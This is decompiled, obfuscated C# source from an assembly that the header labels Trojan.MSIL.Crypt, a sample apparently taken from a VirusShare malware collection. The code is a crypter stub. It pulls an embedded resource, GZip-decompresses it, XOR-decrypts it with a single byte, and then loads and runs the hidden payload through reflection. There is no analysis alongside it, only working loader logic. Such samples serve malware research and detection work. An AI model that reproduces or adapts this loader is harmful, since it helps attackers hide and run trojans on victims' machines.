// Decompiled with JetBrains decompiler
// Type: ___codefort.	
// Assembly: syncui, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 78CA5C80-4468-4951-96CD-AAE77DEC3305
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.MSIL.Crypt.hixz-2c5e5faaed4f224f916102058544604c85e25aea75846857f578c0af84bc5c75.exe

using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;

namespace ___codefort
{
  internal static class \u0013\u0009
  {
    public static Type \u0002\u0003\u0008 { get; [param: In] private set; }

    public static object \u0002\u0003\u0007 { get; [param: In] private set; }

    public static void \u0002\u0003\u0004() => \u000A\u0004.\u0003\u0017\u0001((object) \u000A\u0001.\u0003\u0017\u0016((object) \u0013\u0009.\u0002\u0003\u0008, \u0012\u0014.\u0003\u0002\u0005("mJQ"), \u000A\u0001.\u0002\u0001\u0001\u0001\u0001\u0016\u0003), \u0013\u0009.\u0002\u0003\u0007, (object[]) null, \u000A\u0004.\u0002\u0001\u0001\u0001\u0001\u0016\u0004);

    public static void \u0002\u0003\u0003([In] string[] obj0)
    {
      Assembly assembly = \u000A\u0003.\u0003\u0017\u0003(\u000A\u0003.\u0016\u0005);
      Stream stream = \u000A\u0006.\u0003\u0017\u0005((object) assembly, \u0012\u0014.\u0003\u0002\u0005("`"), \u000A\u0006.\u0002\u0001\u0001\u0001\u0001\u0016\u0006);
      \u0012\u0012 obj;
      byte[] numArray1;
      try
      {
        MemoryStream memoryStream1 = \u000A\u0005.\u0003\u0017\u0007(\u0013\u0009.\u0002\u0003\u0006(stream), \u000A\u0005.\u0003\u0001\u0001\u0001\u0001\u0016\u0007);
        try
        {
          BinaryReader binaryReader = \u000A\u0008.\u0003\u0016\u0009((Stream) memoryStream1, \u000A\u0008.\u0003\u0001\u0001\u0001\u0001\u0016\u0008);
          try
          {
            int num1 = \u000A\u0016.\u0003\u0017\u0012((object) binaryReader, \u000A\u0016.\u0002\u0001\u0001\u0001\u0001\u0016\u0001);
            byte[] numArray2 = \u000A\u0007.\u0003\u0016\u0012((object) binaryReader, num1, \u000A\u0007.\u0002\u0001\u0001\u0001\u0001\u0016\u0009);
            byte num2 = (byte) \u0009\u000A.\u0003\u0016\u0017(\u0009\u000A.\u0003\u0016\u0017(0.8, \u0009\u000A.\u0016\u000A) * (double) byte.MaxValue, \u0009\u000A.\u0016\u0012);
            for (int index = 0; index < num1; ++index)
              numArray2[index] ^= num2;
            MemoryStream memoryStream2 = \u000A\u0005.\u0003\u0017\u0007(numArray2, \u000A\u0005.\u0003\u0001\u0001\u0001\u0001\u0016\u0007);
            try
            {
              obj = new \u0012\u0012((Stream) memoryStream2);
            }
            finally
            {
              if (memoryStream2 != null)
                \u0012\u0002.\u0003\u000A\u0012((object) memoryStream2, \u0012\u0002.\u0002\u0001\u0001\u0001\u0001\u0014\u0009);
            }
            numArray1 = \u000A\u0007.\u0003\u0016\u0012((object) binaryReader, (int) (\u0009\u0013.\u0003\u0016\u0003((object) \u0009\u0009.\u0003\u0016\u0002((object) binaryReader, \u0009\u0009.\u0002\u0001\u0001\u0001\u0001\u0016\u0013), \u0009\u0013.\u0002\u0001\u0001\u0001\u0001\u0016\u0014) - \u0009\u0013.\u0003\u0016\u0003((object) \u0009\u0009.\u0003\u0016\u0002((object) binaryReader, \u0009\u0009.\u0002\u0001\u0001\u0001\u0001\u0016\u0013), \u0009\u0013.\u0002\u0001\u0001\u0001\u0001\u0016\u0015)), \u000A\u0007.\u0002\u0001\u0001\u0001\u0001\u0016\u0009);
          }
          finally
          {
            if (binaryReader != null)
              \u0012\u0002.\u0003\u000A\u0012((object) binaryReader, \u0012\u0002.\u0002\u0001\u0001\u0001\u0001\u0014\u0009);
          }
        }
        finally
        {
          if (memoryStream1 != null)
            \u0012\u0002.\u0003\u000A\u0012((object) memoryStream1, \u0012\u0002.\u0002\u0001\u0001\u0001\u0001\u0014\u0009);
        }
      }
      finally
      {
        if (stream != null)
          \u0012\u0002.\u0003\u000A\u0012((object) stream, \u0012\u0002.\u0002\u0001\u0001\u0001\u0001\u0014\u0009);
      }
      obj.\u0003\u0003\u0017(\u0012\u0014.\u0003\u0002\u0005("VROS"));
      \u0013\u0009.\u0002\u0003\u0008 = obj.\u0003\u0003\u0002(\u0012\u0014.\u0003\u0002\u0005("}PPKLKM^O{FQvROS"));
      // ISSUE: type reference
      // ISSUE: type reference
      // ISSUE: type reference
      \u0013\u0009.\u0002\u0003\u0007 = \u0009\u0015.\u0003\u0016\u0007((object) \u0009\u0012.\u0003\u0016\u0005((object) \u0013\u0009.\u0002\u0003\u0008, new Type[3]
      {
        \u0012\u0001.\u0003\u000A\u0014(__typeref (Assembly), \u0012\u0001.\u0015\u0001),
        \u0012\u0001.\u0003\u000A\u0014(__typeref (byte[]), \u0012\u0001.\u0015\u0001),
        \u0012\u0001.\u0003\u000A\u0014(__typeref (string[]), \u0012\u0001.\u0015\u0001)
      }, \u0009\u0012.\u0002\u0001\u0001\u0001\u0001\u0016\u0016), new object[3]
      {
        (object) assembly,
        (object) numArray1,
        (object) obj0
      }, \u0009\u0015.\u0002\u0001\u0001\u0001\u0001\u0016\u0017);
    }

    private static byte[] \u0002\u0003\u0006([In] Stream obj0)
    {
      byte[] numArray = (byte[]) null;
      BinaryReader binaryReader = \u000A\u0008.\u0003\u0016\u0009(obj0, \u000A\u0008.\u0003\u0001\u0001\u0001\u0001\u0016\u0008);
      try
      {
        int length = \u000A\u0016.\u0003\u0017\u0012((object) binaryReader, \u000A\u0016.\u0002\u0001\u0001\u0001\u0001\u0016\u0001);
        numArray = new byte[length];
        GZipStream gzipStream = \u0009\u0014.\u0003\u0015\u0009(obj0, CompressionMode.Decompress, \u0009\u0014.\u0003\u0001\u0001\u0001\u0001\u0017\u0001);
        \u0009\u0017.\u0003\u0015\u0012((object) gzipStream, numArray, 0, length, \u0009\u0017.\u0002\u0001\u0001\u0001\u0001\u0017\u0002);
        \u0012\u0002.\u0003\u000A\u0012((object) gzipStream, \u0012\u0002.\u0002\u0001\u0001\u0001\u0001\u0014\u000A);
      }
      finally
      {
        if (binaryReader != null)
          \u0012\u0002.\u0003\u000A\u0012((object) binaryReader, \u0012\u0002.\u0002\u0001\u0001\u0001\u0001\u0014\u0009);
      }
      return numArray;
    }

    private static void \u0002\u0003\u0005([In] Stream obj0, [In] Stream obj1)
    {
      byte[] numArray = new byte[4096];
      int num;
      while ((num = \u0009\u0017.\u0003\u0015\u0012((object) obj0, numArray, 0, numArray.Length, \u0009\u0017.\u0002\u0001\u0001\u0001\u0001\u0017\u0002)) != 0)
        \u0009\u0016.\u0003\u0015\u0014((object) obj1, numArray, 0, num, \u0009\u0016.\u0002\u0001\u0001\u0001\u0001\u0017\u0003);
    }
  }
}
